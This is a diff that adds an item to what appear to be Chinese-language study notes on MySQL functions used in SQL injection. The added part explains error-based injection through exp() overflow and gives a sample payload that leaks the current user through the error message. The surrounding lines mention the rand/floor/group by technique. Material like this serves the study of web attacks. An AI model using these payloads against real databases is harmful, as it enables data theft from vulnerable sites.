@@ -219,3 +219,18 @@ select rand();
 该函数用于将一个浮点数向下取整得到整数，可以与rand函数配合使用。在特定情况下，rand、floor、count(*)配合group by可以进行报错注入。
 
 >关于rand、floor、count(*)和group by进行报错注入的方法几原理，可以参考以下文章：https://www.2cto.com/article/201604/498394.html
+
+17.exp()
+
+这是一个数学函数，可以求e的多少次幂，当参数过大时会因为溢出2而报错。使用该函数时，通常将查询结果取反以便得到一个非常大的数。用法如下：
+
+```mysql
+select exp(~(select*from(select user())x));
+```
+
+得到的结果为：
+```txt
+DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'
+```
+
+有一个需要注意的点就是版本问题，并不是所有的版本都可用。
